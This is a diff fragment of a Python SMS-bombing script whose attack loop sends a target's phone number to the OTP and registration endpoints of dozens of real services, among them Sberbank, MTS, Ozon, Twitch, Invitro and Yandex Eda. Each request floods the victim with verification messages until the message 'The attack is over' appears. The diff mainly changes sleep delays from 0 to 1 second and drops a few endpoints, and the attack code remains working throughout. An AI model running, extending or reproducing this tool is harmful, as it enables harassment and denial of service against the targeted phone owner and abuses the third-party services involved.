         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8924,7 +8652,7 @@ if call == str(2):
                           json={"country": _codes[_code].upper(), "phone": _phone, })
             R = R + 1
             print('[+] OnTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8935,7 +8663,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Iqos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8947,7 +8675,7 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -8961,7 +8689,7 @@ if call == str(2):
                                 'phone': _phone})
             R = R + 1
             print('[+] tarantino-family Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8977,7 +8705,7 @@ if call == str(2):
                                 "utc_offset": "120", })
             R = R + 1
             print('[+] Apteka Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8989,7 +8717,7 @@ if call == str(2):
                           headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
             R = R + 1
             print('[+] Uklon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9001,7 +8729,7 @@ if call == str(2):
                           json={"phone": _phone, "otpId": 0})
             R = R + 1
             print('[+] Ozon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9014,7 +8742,7 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9025,7 +8753,7 @@ if call == str(2):
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9037,7 +8765,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9048,7 +8776,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9060,7 +8788,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9073,7 +8801,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9085,7 +8813,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9096,7 +8824,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9107,7 +8835,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9119,7 +8847,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9131,7 +8859,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9144,7 +8872,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9157,7 +8885,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9168,7 +8896,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9181,7 +8909,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9192,7 +8920,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9205,7 +8933,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -9218,7 +8946,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9230,7 +8958,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9242,7 +8970,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9255,7 +8983,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9268,7 +8996,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9280,7 +9008,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9291,7 +9019,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9302,7 +9030,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9313,7 +9041,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9325,7 +9053,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9338,7 +9066,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9350,33 +9078,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -9385,7 +9090,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9410,7 +9115,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9422,7 +9127,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9433,7 +9138,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9445,7 +9150,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9456,7 +9161,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9469,7 +9174,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9480,7 +9185,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9491,7 +9196,7 @@ if call == str(2):
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9504,14 +9209,14 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9523,7 +9228,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9534,7 +9239,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9546,7 +9251,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9559,7 +9264,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9570,7 +9275,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9581,7 +9286,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9592,7 +9297,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9604,7 +9309,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9616,7 +9321,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9629,7 +9334,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9642,7 +9347,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9653,7 +9358,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9666,7 +9371,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9677,7 +9382,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9690,7 +9395,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -9703,7 +9408,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9715,7 +9420,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9731,7 +9436,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9744,7 +9449,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9757,7 +9462,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9769,7 +9474,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9780,7 +9485,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9791,7 +9496,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9802,7 +9507,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9814,7 +9519,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9827,7 +9532,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -9839,33 +9544,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -9874,7 +9556,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10242,28 +9924,6 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
@@ -10390,7 +10050,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10402,7 +10062,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10413,7 +10073,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10425,7 +10085,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10436,7 +10096,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10449,7 +10109,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10460,7 +10120,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         try:
@@ -10505,7 +10165,7 @@ if call == str(2):
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                 'deviceToken': '*'}, headers={
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-            time.sleep(0)
+            time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -10514,7 +10174,7 @@ if call == str(2):
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10525,7 +10185,7 @@ if call == str(2):
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
